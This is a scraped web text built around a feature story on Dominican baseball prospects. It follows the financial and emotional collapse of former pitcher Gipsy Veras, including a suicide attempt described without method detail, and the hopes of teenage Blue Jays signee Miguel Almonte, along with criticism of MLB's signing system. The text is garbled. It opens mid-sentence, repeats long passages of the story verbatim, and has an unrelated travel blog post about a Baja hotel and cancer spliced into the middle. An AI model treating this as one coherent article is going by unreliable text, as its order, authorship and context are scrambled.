Herrera </em>neighborhood, the kind of place a Santo Domingo cop and housewife raising four kids could afford. Only half the house was finished. There were blueprints for what the other side should look like, but the family didn&#x2019;t have enough money to make it livable.</p>      <p>Now, it&#x2019;s three stories, with a balcony overlooking the street, mahogany furniture and patterned sofas. Gipsy and Jose, now a $4 million per year relief pitcher for the Chicago Cubs, bought the family its first washing machine around the time of their signing.</p>      <p>&#x201c;I want a stove,&#x201d; their mother would say, and it&#x2019;d be there the next day.</p>      <p>The brothers must have poured $20,000 into the house.</p>      <p>Gipsy&#x2019;s spending didn&#x2019;t stop there. At parties, he&#x2019;d bring extra clothes along to ensure he was prepared if someone was dressed better than him. He was blowing through $100,000 like it was nothing, like it was replaceable.</p>      <p>All the while, he was splitting time between the United States and the Dominican Republic, trying to, at the very least, make it onto the High-A roster. His growth was impressing coaches in the Gulf Coast. His fastball had gone from 86 mph to 88 in a matter of months, then 90, 91 during the next few years.</p>      <p>In his mind, he was making it. Living his dream.</p>      <p>Then he got traded.</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>A stack of boxes reaches almost to the ceiling in the family&#x2019;s living room, making the couch nearly unsittable. A dark hallway leads to the cramped kitchen, where the family&#x2019;s supply of cereals, bread, granola bars sits atop a yellowing fridge. Miguel&#x2019;s hole-in-the-wall room sits off to the side, next to the sliver that serves as the family bathroom. A spigot poking out of the wall serves as the family shower.</span></p>      <p>But soon, the Almontes will leave their cramped quarters for a five-bedroom house in another neighborhood. The kind of place where Negra has dreamed of opening a new salon for years. She opened her current one four years ago after her husband was laid off.</p>      <p>To save money before Miguel signed his contract, she says, she&#x2019;d go days at a time without eating. Miguel remembers a time she didn&#x2019;t eat for three whole days. Now, thanks in part to the salon carved out of the family garage, the Almontes are in better financial standing.</p>      <p>Standing over a torn up, black leather chair, she applies coloring to a woman&#x2019;s hair, trying to make conversation over the buzz of a fan on its highest setting. Miguel looks on from the armchair next to the salon&#x2019;s <b>iron</b> gate.</p>      <p>&#x201c;I don&#x2019;t want her to be here anymore.&#x201d;</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>After saving his first game with the San Francisco Giants&#x2019; rookie league affiliate, Gipsy was convinced the move to Arizona would work out after all. But, he says, managers soon proved him wrong.</span></p>      <p>Just days after Gipsy arrived, he says, the scout who signed him began traveling on team business.</p>      <p>&#x201c;From then on, everything turned into a nightmare,&#x201d; Gipsy says.</p>      <p>He&#x2019;d go 20 days without playing, then the manager would send him into the game with no warm up. His fastball began to slow down. A searing pain shot up his right arm. He had no scout, no ally, to advocate for him. And he barely spoke English, which made it harder to defend himself.</p>      <p>But the man who says he was a Summer League leader in saves the year before didn&#x2019;t want to risk complaining. Those who complained might be dropped from the team a day after registering a win. It happened to Dominican players all the time. His brother Jose says Dominican players would routinely gather in hotels rooms and bawl their eyes out after seeing friends sent home.</p>      <p>Gipsy reached a point, he says, where no one believed in him anymore. Even Jose, who was well on his way to making the 40-man roster, says he stopped answering his brother&#x2019;s calls, not wanting to be distracted by negative thoughts.</p>      <p>Gipsy says prejudice factored into to the way he was treated.</p>      <p>&#x201c;The manager I got didn&#x2019;t treat me well,&#x201d; he says. &#x201c;It seemed like he didn&#x2019;t like Latino baseball players too much. He liked the baseball players, like they say, &#x2018;from the farm.&#x2019; &#x201d;</p>      <p>Now, Gipsy started feeling the pressure to inject.</p>      <p>&#x201c;I wanted to throw faster,&#x201d; he says. &#x201c;I wanted to compete with those above my level. And yes, it did cross my mind.&#x201d;</p>      <p>But then he began to think about the consequences, the embarrassment to his family.</p>      <p><em>&#x201c;Don&#x2019;t do it. It&#x2019;s going to turn out bad. You can die, you can get a heart attack.&#x201d;</em></p>      <p>He never did do steroids, he says, and his fastball lost a little more of its punch every day. Still, there were flashes of promise toward the end of his season in Arizona.</p>      <p>&#x201c;I remember I pitched six innings with no runs, six innings with no runs,&#x201d; Gipsy said.</p>      <p>He received the news a day later. Stormed out of the stadium still wearing his uniform. The flight was already arranged. Within 24 hours, he&#x2019;d be back on a plane to Santo Domingo.</p>      <p>&#x201c;The last one to find out is you.&#x201d;</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><em>&#x201c;Tomorrow, I go from being a normal baseball player to being a professional baseball player. A professional player.&#x201d;</em></p>      <p>The night before his signing, Miguel lies in bed picturing big league stadiums &#x2013;&#xa0;Rogers Centre, Fenway, Wrigley &#x2013; unable to sleep. Already imagining the stroke of the pen that would change his life.</p>      <p>&#x201c;I wanted to sign already,&#x201d; he said. &#x201c;I wanted to feel that joy already.&#x201d;</p>      <p>His trainers had informed him of the Blue Jays&#x2019; decision weeks before it was made official. But still, Miguel couldn&#x2019;t shake the possibilities from his mind. People were going to see him as a professional baseball player.</p>      <p>Ever since Neftali Cruz took him under his wing at 7, he&#x2019;d been working for this moment. He&#x2019;d devoted his life to baseball, and now it was finally paying off.</p>      <p>Only two years earlier, he&#x2019;d lie awake on this mattress, stomach growling, unable to sleep on an empty stomach.</p>      <p><em>&#x201c;A professional baseball player.&#x201d; </em></p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>Farrell says the average career of a Dominican signee lasts between two and three years. He said there&#x2019;s weight on Dominican boys to succeed from birth, to lead their families out of poverty and be the salvation for entire villages and neighborhoods in the country. Those who don&#x2019;t succeed are immediately regarded as failures. The pressure on signees is immense.</span></p>      <p>&#x201c;There&#x2019;s a saying in Dominican baseball that &#x2018;If I don&#x2019;t succeed in baseball, the devil takes me away,&#x2019;&#x201d; Farrell said. &#x201c;It&#x2019;s like if their soul has been consumed. And you can see it in the eyes of some of these kids sometimes. You ask them, &#x2018;What are you going to the do with the rest of your life?&#x2019; And it&#x2019;s, &#x2018;I have no rest of my life. My life is over because I did not succeed in baseball.&#x2019; &#x201d;</p>      <p>If such a system were to be implemented in the United States, Farrell said, there&#x2019;d be mass paranoia. Nowhere else in sports is an industry solely based on the skills of 16-year-old kids. Nowhere else is exploitation so ingrained in the fabric of a sport.</p>      <p>&#x201c;You&#x2019;d have chaos if suddenly 13-, 14-year-olds were dropping out of school to become NBA players of NFL players,&#x201d; he said. &#x201c;It just would not happen.&#x201d;</p>      <p>Farrell says the sport destroys more than it saves.</p>      <p>Go to any taxi stand in the Dominican Republic and see for yourself, he says, the burly men lined up waiting to tell the stories of how their careers ended abruptly, without warning.</p>      <p>&#x201c;There&#x2019;s something fundamentally wrong with a system that tells you you&#x2019;re a failure at age 20.&#x201d;</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>&#x201c;</span><i>You are not a baseball player anymore. You&#x2019;re nobody.&#x2019; &#x201d;</i></p>      <p>Now, back in his mother&#x2019;s home in Santo Domingo, a home his bonus check had expanded and remodeled, Veras laid in bed unresponsive. Saliva drenched his pillow.</p>      <p>He&#x2019;d spent the day&#x2019;s early hours locked in his bedroom, crying often, refusing food. Just getting out of bed seemed a monumental task. More than once, his mother came by to check on him.</p>      <p>&#x201c;Gipsy,&#x201d; she said, &#x201c;Gipsy. You have to eat something.&#x201d;</p>      <p>Gipsy remembered looking into the mirror, the feelings of failure as he made out the stocky figure reflected within it. Embarrassment overtook him. Shock.</p>      <p>Finally, he rose with sights set on his mother&#x2019;s medicine cabinet. He grabbed the first bottle he could find, retreating to his dark bedroom. One by one, he slipped the unmarked prescription pills into his mouth until he started feeling dizzy. He faded soon after the nausea set in.</p>      <p>Hours passed, and darkness fell on Santo Domingo, Gipsy lying there unnoticed.</p>      <p>Life in the pressure cooker of the Major League farm system had taken its toll. The pain in his right arm &#x2014; his pitching arm &#x2014; had become unbearable. The money that fueled weekend-long beach getaways in the northern Dominican Republic had long ago disappeared. Now, back home with no Major League contract, no education and no professional skills, Gipsy had nowhere to go. Baseball was his life for 15 years. He didn&#x2019;t know anything else.</p>      <p>He woke up. Confused, alive.</p>      <p>Days after his failed suicide attempt, he attended a church group with his close friend C&#xe9;sar. The group went out to eat, and everyone started talking about work. Except Gipsy.</p>      <p>&#x201c;They were all talking about their professions and I joked saying, &#x201c;So who&#x2019;s going to talk baseball with me?&#x201d;</p>      <p>&#x201c;No one.&#x201d;</p>      <p>It was like a joke, Gipsy said, no one cared to give attention to.</p>      <p>&#x201c;And it got me thinking. They were doctors, graduates, architects, medicine, lawyers&#x2026;</p>      <p><i>&#x201c;Oh, how are you doing at the university?&#x201d; </i></p>      <p><i>&#xa0;&#x201c;I&#x2019;m doing well.&#x201d; </i></p>      <p><i>&#x201c;Oh, I&#x2019;m in this university,&#x201d; </i></p>      <p><i>&#x201c;I&#x2019;m in this other one.&#x201d; </i></p>      <p>&#x201c;And so I asked myself, &#x2018;What are you?&#x2019; &#x201d;</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p>Almonte and his mentor Neftali Cruz sit in the stands of an empty <i>Estadio Quisqueya</i>, talking baseball. Cruz has an arm around the 17-year-old. They&#x2019;re watching the Licey Tigers&#x2019; batting practice, looking on as minor leaguers and Dominican prospects and marginal major leaguers send longballs over the sea of Presidente ads making up the fence.</p>      <p>&#x201c;Carlos Beltran used to take 500 swings a day,&#x201d; Cruz tells him. &#x201c;Sosa took two hours of batting practice before every game.&#x201d;</p>      <p>Cruz, a Blue Jays scout who spent 14 years in the Pirates&#x2019; farm system, says he likes working with Dominican prospects because of their raw, unmatched desire to succeed.</p>      <p>&#x201c;When they&#x2019;re hungry,&#x201d; he says, &#x201c;they can learn. This game is repetition. You have to put in the brain. It&#x2019;s like going to school. You study before you take the test. Baseball is the same way. If you don&#x2019;t put in the mind, 50,000 people are going to be disappointed.&#x201d;</p>      <p>Later, Miguel stands and looks on as the Escogido Lions prepare for a 7 p.m. game. Standing in batter&#x2019;s eye relation to home plate, he begins listing off the Dominican MLB players he thinks have the best sounding names. Pedro Martinez. Robinson Cano. Albert Pujols.</p>      <p>Miguel grabs onto the backstop and leans into the net. He glances at the corners of the stadium, its 335-foot foul poles. Then he stares into the outfield, silent, imagining.</p>      <p>&#x201c;It&#x2019;s a good name for a baseball player,&#x201d; he says. &#x201c;Miguel Almonte.&#x201d;</p>      <p><em>(Tatiana Fernandez provided translations during the reporting of this story.

   <div>    <p>Sometimes the various worlds that we keep carefully compartmentalized come crashing together. That&#x2019;s what happened to me when I visited the Hotel California in the tiny Baja town of Todos Santos. (Not <i>the</i> Hotel California the Eagles sang about, or at least not exactly, but I&#x2019;ll get to that later.) </p>   <p>In addition to being a travel writer, I&#x2019;m a health writer. When wearing my &#x201c;other hat,&#x201d; I&#x2019;m a Senior Editor at , a health site for people (namely, most of us baby boomers and post-boomers) who are caring for aging parents, spouses, and other family members. For Caring.com I write about cancer and general health, particularly the serious diseases that afflict us as we age. I&#x2019;ve been a health writer for a long time; much longer, actually, than I&#x2019;ve been a travel writer.&#xa0; My stories about nutrition, anxiety, osteoporosis, back pain, and many other subjects have appeared in national magazines, and if people recognize my name at all, it&#x2019;s in that capacity. So I&#x2019;m comfortable talking about health issues, even those that make many people feel sad and uneasy.</p>   <p>But back to my story; I was in as a travel writer, not a health writer. And I was visiting the to see what the organizer of our trip thought was one of the most beautiful &#x2013; and most personal &#x2013; boutique hotels in the region. I instantly agreed; in fact I fell in love with the design sensibility of the hotel, and by association with its creators. I ran around photographing doors, light fixtures, <b>iron</b> <b>gates</b>, potted plants, and waited eagerly to meet the owner, Debbie Stewart. </p>   <p>When Debbie came out of the office, I had lots of questions. I was also researching a story about the influx of American and Canadian seniors moving south to retire in Baja, and wanted to ask her thoughts, since I knew she and her husband had been among the early wave of resident expats. What I didn&#x2019;t expect were the tears that came to her eyes when I asked if they planned to stay in Baja during their later years.&#xa0; It turned out that Debbie had come to Todos Santos, a tiny town an hour north of , with her husband John to carry out a dream &#x2013; <i>his</i> dream. He&#x2019;d found the hotel, which was rumored to be the infamous Hotel California of the eerie Eagles hit. (It&#x2019;s not &#x2013; years of gossip and rumor ended with a journalist asking Don Henley point blank &#x2013; and he said he&#x2019;d never been there.)</p>   <p>It was run down and decrepit when the Stewarts found it, and John&#x2019;s enthusiasm and vision had guided them through six years of hard work to bring it back to vivid, colorful life. They found artisans to make furniture, brought back carved doors from Oaxaca, designed ironwork and had it made by local craftspeople. The incredible artistic detail I&#x2019;d noted had all been John&#x2019;s doing, Debbie said; she&#x2019;d just helped him make it happen. Then in 2006, when the hotel had had a few years to become a success, John found out he had colon cancer. He fought it, but it was fast, and he died in September. He was still young, in his late 50s, hale and healthy, but the cancer won.</p>   <p>Learning that I wrote about cancer, and that I&#x2019;d been inspired to do so by losing my father too young to aggressive esophageal cancer, Debbie talked to me about what a blow John&#x2019;s death had been. She&#x2019;d thought she&#x2019;d return to Canada, she said; her friends and family insisted she come home where they could take care of her. But she couldn&#x2019;t bring herself to leave. She felt compelled to continue to carry out the dream they&#x2019;d created together running the Hotel California, now hugely successful. How could she abandon it now? And Todos Santos had become home. &#x201c;People come back year after year, and they&#x2019;d be crushed if it wasn&#x2019;t the same experience,&#x201d; Debbie says. &#x201c;Many of them have become friends, and then I have so many friends in town. Our New Year&#x2019;s Eve parties are famous around here.&#x201d;</p>   <p>There&#x2019;s also the restaurant, , which has earned fame in its own right, respected by fans of nuevo Mexican food. Voluble chef Dany Lamote, who landed in Baja from Belgium and is now raising his young family here, is a fanatic about the details; I spent an hour with him talking about salt. He makes his own evaporated sea salt, which now sells by the bag in the hotel&#x2019;s gift shop. He also teaches cooking classes and has a cookbook out with recipes from La Coronela, which was selling briskly during my visit. (He&#x2019;s signing it in the photo.)</p>   <p>The afternoon I spent talking to Debbie over Dany&#x2019;s incredible food has stayed with me much more vividly than many other meals, many other visits to lovely hotels. We met to talk travel, and ended up connected by cancer, as I&#x2019;ve ended up connected to many others over the years. I&#x2019;ll be back for a longer stay, because the Hotel California, and the artistic haven of Todos Santos, was one of the most compelling places I&#x2019;ve discovered in Baja. But I&#x2019;ll remember Debbie Stewart for deeper reasons, and I wish her well.</p>   </div>

The men jumped from city to city, stopping ashore in Cabarete, Puerto Plata, Gaspar Hernandez. They drank rum and Cokes and <em>pina coladas</em> on the water as their real girlfriends awaited them 200 miles away in Cout&#xed;. In one weekend, Veras alone blew more than 50,000 <em>pesos</em>, about $3,000.</p>      <p>Alone on the open road, and still wearing baseball pants they put on three days earlier, they shared memories of the mini-vacation as the aqua-colored Toyota whisked around S-shaped turns at 70 mph. Exhausted, Veras leaned his head on the cold car window and fell asleep.</p>      <p>Minutes later, his heavy eyelids opened back up.</p>      <p><em>&#x201c;Where are we?&#x201d;</em></p>      <p>A tree stump laid arms-length away, the new car resting calmly against the trunk. The car&#x2019;s hood smashed in. Blackness engulfed them.</p>      <p>&#x201c;<em>Mi carro</em>,&#x201d; Gipsy thought to himself. &#x201c;<em>Mi carro</em>.&#x201d;</p>      <p>The men were just lucky they didn&#x2019;t plunge off the cliff.</p>      <p>If Gipsy&#x2019;s foster brother Frank hadn&#x2019;t hit a tree, the two of them might have been dead, and Gipsy never would have become a pitching coach in the Blue Jays&#x2019; system, his most recent job. He wouldn&#x2019;t become someone who took all those pills.</p>      <p>He wouldn&#x2019;t have become anything.</p>      <p>And nearly 20 years later, prospect Miguel Almonte wants to become something.</p>      <p>&#x2022; &#x2022; &#x2022;</p>      <p>Yewri Guill&#xe9;n&#x2019;s head wouldn&#x2019;t stop throbbing. A free clinic doctor diagnosed the 18-year-old Washington Nationals signee with bacterial meningitis almost three years ago, but because the terms of his deal weren&#x2019;t yet complete, he couldn&#x2019;t foot the bill for a $1,300 stay at a private hospital. And the headaches continued.</p>      <p>The MLB investigated Guill&#xe9;n for identity fraud and suspended him for a year before he lay ill in a hospital bed, with the league claiming he lied about his birthday to increase his signing bonus. Guill&#xe9;n was supposed to travel to Florida to play for the Nationals&#x2019; rookie league team there in mid-April, after the MLB authorized his contract. But he never made it. Instead of flying to the United States April 15, 2011 as planned, he died in a clinic that day, according to a March story in Mother Jones.</p>      <p>Long before the incident came to light, Major League Baseball&#x2019;s relationship with the island nation was regarded as predatory by critics Dominican and American. Five years ago, the MLB sent activist Charles Farrell to Santo Domingo to examine the issues surrounding baseball in the country. What he found was a system that destroyed young lives: scouts, known as <em>buscones</em> or searchers, taking large cuts of players&#x2019; signing bonuses for themselves. Trainers pumping illegal substances into players to increase their chances of success. Players with no sense of money or how to manage it blowing their entire bonus checks in a matter of years, even in just a few months. Players routinely lied about their names and ages to increase their chances of being signed. MLB officials would never know his real name, but Gipsy Veras fell into nearly every trap.</p>      <p>The problem is simple: MLB teams like the Blue Jays treat Dominican players as investments, looking at the country as an arm of a larger $4 billion business model. And the minimum age to sign Dominican players, 16, &#x2013; &#x201c;and they&#x2019;d take them younger if they could,&#x201d; Farrell says &#x2013; reflects the league&#x2019;s attitude. Players in the United States must be 18, or have completed high school to sign. Teams regard the Dominican Republic as an unregulated free agent pool.&#xa0; And young Dominicans feed into it.</p>      <p>They want to have it made. Problem is, on opening day last year, only 83 of their countrymen appeared on rosters. One out of 50 signees will ever make it to the majors. And that&#x2019;s just for a single day, a cup of coffee. For many, the journey to get there &#x2013; or the aftermath of getting cut &#x2013; will be the most difficult part.</p>      <p>The question now is where baseball will take 17-year-olds like Almonte, a Blue Jays prospect who signed a $100,000 contract July 2.&#xa0; The odds facing kids like him are long &#x2013; &#x201c;astronomical,&#x201d; in Farrell&#x2019;s eyes.</p>      <p>The fates of thousands like Gipsy, on the other hand, have already been sealed. After stints as pitching coach with the Minnesota Twins, Los Angeles Dodgers and most recently the Blue Jays, the 35-year-old is now working as a trainer and scout for young Dominican players. But for him, life after baseball almost didn&#x2019;t happen at all.</p>      <p>Like him, thousands will return to the Dominican Republic after seeing their Major League dreams fail, with little money, no education and no professional skills.</p>      <p>Miguel Almonte just hopes he&#x2019;s not one of them.</p>      <p><em>Miguel Almonte has worked at making it to the United States to play baseball since he was 7. For many in his position, there&#x2019;s weight to succeed from birth, to lead families out of poverty and be the salvation for entire neighborhoods and villages in the country.</em></p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><em>&#x201c;Leading off for the Blue Jays, shortstop&#x2026;&#x201d;</em></p>      <p>The announcers still haven&#x2019;t learned how to say his name. Maybe, they never will. But at age 17, Miguel Almonte is already batting ahead of all-stars Jos&#xe9; Bautista and Edwin Encarnaci&#xf3;n.</p>      <p>The manager had to bench the teenager&#x2019;s favorite player, Jose Reyes, to make this lineup possible. But early on into the season, the move is paying dividends. Through a few months of play, Almonte bats .315 with 10 homers. The 5-foot-11, 186-pound teen is one of the most feared hitters in the American League East. He&#x2019;s dominating.</p>      <p>The fantasy is getting more real by the day. And sure, it&#x2019;s only possible in video game form right now &#x2013; Miguel, still stuck playing and managing his MLB 2K11 Blue Jays team. But lately, the dream&#x2019;s been starting to feel tangible.</p>      <p>On a muggy December afternoon in east Santo Domingo, the acne-ridden teenager sits in his mom&#x2019;s patio hair salon, swiping through pictures on his smartphone before baseball practice. He&#x2019;s easily the best-dressed person in the neighborhood today, wearing a plaid shirt with rolled-up sleeves, fitted blue jeans and a silver wristwatch.</p>      <p>&#x201c;This one is cheap,&#x201d; he says, referring to the timepiece, the label on which reads &#x201c;Bell.&#x201d;</p>      <p>As his mother applies rollers to a woman&#x2019;s hair, he begins scrolling down the website of fashion label Nautica. Moments later, the kid with the chinstrap beard pulls up a picture of a chrome-faced watch with a blue leather strap, and a set of smaller gauges.</p>      <p><em>&#x201c;Eeesstyle,&#x201d;</em> the 17-year-old says, hesitantly in English. &#x201c;It&#x2019;s $350. I&#x2019;m think I&#x2019;m going to buy it.&#x201d;</p>      <p>Coaches have warned Miguel about purchases like these. But sometimes, he says, it&#x2019;s hard not to treat himself.</p>      <p>On July 2, the 17-year-old inked a $100,000 minor league contract with the Blue Jays. A fourth of his signing bonus went to his coach, Augustine Ramos of the Neftali Cruz development league, where he was discovered. Fifty thousand dollars is being put away for his mother&#x2019;s new five-bedroom home in an upscale Santo Domingo neighborhood.</p>      <p>With the rest of the money, Miguel says he wants to buy himself a car &#x2013; something practical.</p>      <p>Maybe a Camry.</p>      <p><em>&#xa0;<strong>&#x2022;&#x2022;&#x2022;</strong></em></p>      <p><span>The first thing that strikes you about Gipsy Veras is his cleanly pressed Gucci polo, with red and green trimming on the sleeves and collar, conforming perfectly to a bulging chest, rounded belly, and toned arms. Stress pulls at the 35-year-old&#x2019;s drooping eyes, the lines running up his forehead and escaping onto a hairless scalp. He wears lime green fitted slacks. The links of his stainless steel wristwatch glimmer like the silver cross adorning his neck. Gipsy could not afford to buy the outfit he&#x2019;s wearing today.</span></p>      <p>The parallels between him and a 17-year-old on the other side of town are hard to ignore. Like Miguel, Gipsy signed a six-figure contract to play professionally as a teen. Like Miguel, he put a large chunk of his bonus money into a house for Mom. Like Miguel, he indulged in the latest fashions right away, constantly trying to outdo friends in the neighborhood.</p>      <p>Like Miguel, Gipsy was going to be famous.</p>      <p>Isn&#x2019;t everyone?</p>      <p>Gipsy&#x2019;s story is about poverty and wealth and how wealth can cause poverty all over again. It&#x2019;s about having nicer clothes than your teenage friends, the Nautica watch and Nikes, and doing favors &#x2013; 100 <em>pesos</em> here to buy lunch for a neighbor, another 500 there to pay his rent &#x2013; favors for everyone but yourself. It&#x2019;s a story about when dreams consume people, and swallow them whole. All while executives in tall buildings a country away, less than a 1,000 miles away, cash in on the successes of the lucky few, on the talent of your countrymen, mired in a limited economic system.</p>      <p>This is a story about sitting in your childhood bedroom and facing yourself once you&#x2019;ve lost everything.</p>      <p><span><iframe>&amp;amp;lt;a href=&quot;     <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>Every day at 8 a.m., Miguel rolls out of bed and takes a long look in the mirror before baseball practice. He slips his mirrored sunglasses over his freshly cut three-quarter fade, kept perfect by weekly barbershop visits. He squirts Axe body spray onto his chest before throwing the can into his retro Toronto Blue Jays duffle bag.</span></p>      <p>After a breakfast of corn flakes, he leaves the house and heads for the metro station. In his Blue Jays cap and shirt, his Blue Jays shorts and his blue Nikes, the 17-year-old looks as if he&#x2019;s headed straight for the Rogers Centre. Actually, he&#x2019;s walking past <em>colmados</em>, the iconic Dominican street markets, passing a slew of check cashing shops and fruit stands and beggars on his way to <em>Centro Olimpico</em> baseball stadium, a field better known as the one-time playground of national heroes David &#x201c;Big Papi&#x201d; Ortiz, Sammy Sosa and Vladimir Guerrero.</p>      <p>Recently, Miguel says, something weird has been happening on his way to the train. People recognize him now, and they stop him.</p>      <p><em>&#x201c;Hola. Qu&#xe9; lo que?&#x201d;</em></p>      <p>He knows he shouldn&#x2019;t stop, but he likes the attention.</p>      <p>Until, &#x201c;They start talking, and talking for a while and they say, &#x2018;How&#x2019;s it going?&#x2019; Miguel says. &#x201c;And then they say, &#x2018;Bro, do you have 15,000 <em>pesos</em> you can lend me to take care of something?&#x2019; &#x201d;</p>      <p>At the baseball field he takes batting practice with Augustine Ramos, his longtime coach. Taking a hundred swings. Fielding dozens of groundballs. Throwing laser after laser to first from deep short.</p>      <p>Once, he bombed a meatball all the way to the adjacent bus station, clearing the 330-foot fence by a long shot and nearly landing on Avenida John F. Kennedy. Today, it&#x2019;s all line drives and fly balls, but Ramos doesn&#x2019;t mind. The coach says he wants four things out of his players:</p>      <ol>       <li>Speed</li>       <li>Arm strength</li>       <li>Intelligence</li>       <li>Height</li>      </ol>      <p>Miguel&#x2019;s got them down. He&#x2019;ll run a 6.5-second 60-yard dash when he leaves the academy in time for the MLB&#x2019;s Dominican Summer League in June. He can beam a one-hopper to first in a split second. His baseball IQ is above-average for someone his age, though he receives only four hours of schooling every week, well below the standard for American players. At 5-feet-11-inches, he almost has the same frame as Reyes, the current Blue Jays shortstop.</p>      <p>More than anything, Miguel hates when people doubt him.</p>      <p>One time last year, his manager in a select tournament put him at ninth in the batting order. Miguel threatened not to bat if he wasn&#x2019;t moved up. He even cried.</p>      <p>When he got up to the plate in the final inning, Miguel squared up, cocked his bat and launched a walk-off home run into the stands.</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>Gipsy beamed as they wrote the checks. Every Dominican boy wants to build his mom a new house.&#xa0;</span></p>      <p>After signing with the Tampa Bay Devil Rays in 1997, Gipsy decided to make good on a long-held vow: remodel his family home. It started out as two cement rooms in the <em>Para&#xed;so de Herrera </em>neighborhood, the kind of place a Santo Domingo cop and housewife raising four kids could afford. Only half the house was finished. There were blueprints for what the other side should look like, but the family didn&#x2019;t have enough money to make it livable.</p>      <p>Now, it&#x2019;s three stories, with a balcony overlooking the street, mahogany furniture and patterned sofas. Gipsy and Jose, now a $4 million per year relief pitcher for the Chicago Cubs, bought the family its first washing machine around the time of their signing.</p>      <p>&#x201c;I want a stove,&#x201d; their mother would say, and it&#x2019;d be there the next day.</p>      <p>The brothers must have poured $20,000 into the house.</p>      <p>Gipsy&#x2019;s spending didn&#x2019;t stop there. At parties, he&#x2019;d bring extra clothes along to ensure he was prepared if someone was dressed better than him. He was blowing through $100,000 like it was nothing, like it was replaceable.</p>      <p>All the while, he was splitting time between the United States and the Dominican Republic, trying to, at the very least, make it onto the High-A roster. His growth was impressing coaches in the Gulf Coast. His fastball had gone from 86 mph to 88 in a matter of months, then 90, 91 during the next few years.</p>      <p>In his mind, he was making it. Living his dream.</p>      <p>Then he got traded.</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>A stack of boxes reaches almost to the ceiling in the family&#x2019;s living room, making the couch nearly unsittable. A dark hallway leads to the cramped kitchen, where the family&#x2019;s supply of cereals, bread, granola bars sits atop a yellowing fridge. Miguel&#x2019;s hole-in-the-wall room sits off to the side, next to the sliver that serves as the family bathroom. A spigot poking out of the wall serves as the family shower.</span></p>      <p>But soon, the Almontes will leave their cramped quarters for a five-bedroom house in another neighborhood. The kind of place where Negra has dreamed of opening a new salon for years. She opened her current one four years ago after her husband was laid off.</p>      <p>To save money before Miguel signed his contract, she says, she&#x2019;d go days at a time without eating. Miguel remembers a time she didn&#x2019;t eat for three whole days. Now, thanks in part to the salon carved out of the family garage, the Almontes are in better financial standing.</p>      <p>Standing over a torn up, black leather chair, she applies coloring to a woman&#x2019;s hair, trying to make conversation over the buzz of a fan on its highest setting. Miguel looks on from the armchair next to the salon&#x2019;s iron gate.</p>      <p>&#x201c;I don&#x2019;t want her to be here anymore.&#x201d;</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>After saving his first game with the San Francisco Giants&#x2019; rookie league affiliate, Gipsy was convinced the move to Arizona would work out after all. But, he says, managers soon proved him wrong.</span></p>      <p>Just days after Gipsy arrived, he says, the scout who signed him began traveling on team business.</p>      <p>&#x201c;From then on, everything turned into a nightmare,&#x201d; Gipsy says.</p>      <p>He&#x2019;d go 20 days without playing, then the manager would send him into the game with no warm up. His fastball began to slow down. A searing pain shot up his right arm. He had no scout, no ally, to advocate for him. And he barely spoke English, which made it harder to defend himself.</p>      <p>But the man who says he was a Summer League leader in saves the year before didn&#x2019;t want to risk complaining. Those who complained might be dropped from the team a day after registering a win. It happened to Dominican players all the time. His brother Jose says Dominican players would routinely gather in hotels rooms and bawl their eyes out after seeing friends sent home.</p>      <p>Gipsy reached a point, he says, where no one believed in him anymore. Even Jose, who was well on his way to making the 40-man roster, says he stopped answering his brother&#x2019;s calls, not wanting to be distracted by negative thoughts.</p>      <p>Gipsy says prejudice factored into to the way he was treated.</p>      <p>&#x201c;The manager I got didn&#x2019;t treat me well,&#x201d; he says. &#x201c;It seemed like he didn&#x2019;t like Latino baseball players too much. He liked the baseball players, like they say, &#x2018;from the farm.&#x2019; &#x201d;</p>      <p>Now, Gipsy started feeling the pressure to inject.</p>      <p>&#x201c;I wanted to throw faster,&#x201d; he says. &#x201c;I wanted to compete with those above my level. And yes, it did cross my mind.&#x201d;</p>      <p>But then he began to think about the consequences, the embarrassment to his family.</p>      <p><em>&#x201c;Don&#x2019;t do it. It&#x2019;s going to turn out bad. You can die, you can get a heart attack.&#x201d;</em></p>      <p>He never did do steroids, he says, and his fastball lost a little more of its punch every day. Still, there were flashes of promise toward the end of his season in Arizona.</p>      <p>&#x201c;I remember I pitched six innings with no runs, six innings with no runs,&#x201d; Gipsy said.</p>      <p>He received the news a day later. Stormed out of the stadium still wearing his uniform. The flight was already arranged. Within 24 hours, he&#x2019;d be back on a plane to Santo Domingo.</p>      <p>&#x201c;The last one to find out is you.&#x201d;</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><em>&#x201c;Tomorrow, I go from being a normal baseball player to being a professional baseball player. A professional player.&#x201d;</em></p>      <p>The night before his signing, Miguel lies in bed picturing big league stadiums &#x2013;&#xa0;Rogers Centre, Fenway, Wrigley &#x2013; unable to sleep. Already imagining the stroke of the pen that would change his life.</p>      <p>&#x201c;I wanted to sign already,&#x201d; he said. &#x201c;I wanted to feel that joy already.&#x201d;</p>      <p>His trainers had informed him of the Blue Jays&#x2019; decision weeks before it was made official. But still, Miguel couldn&#x2019;t shake the possibilities from his mind. People were going to see him as a professional baseball player.</p>      <p>Ever since Neftali Cruz took him under his wing at 7, he&#x2019;d been working for this moment. He&#x2019;d devoted his life to baseball, and now it was finally paying off.</p>      <p>Only two years earlier, he&#x2019;d lie awake on this mattress, stomach growling, unable to sleep on an empty stomach.</p>      <p><em>&#x201c;A professional baseball player.&#x201d; </em></p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>Farrell says the average career of a Dominican signee lasts between two and three years. He said there&#x2019;s weight on Dominican boys to succeed from birth, to lead their families out of poverty and be the salvation for entire villages and neighborhoods in the country. Those who don&#x2019;t succeed are immediately regarded as failures. The pressure on signees is immense.</span></p>      <p>&#x201c;There&#x2019;s a saying in Dominican baseball that &#x2018;If I don&#x2019;t succeed in baseball, the devil takes me away,&#x2019;&#x201d; Farrell said. 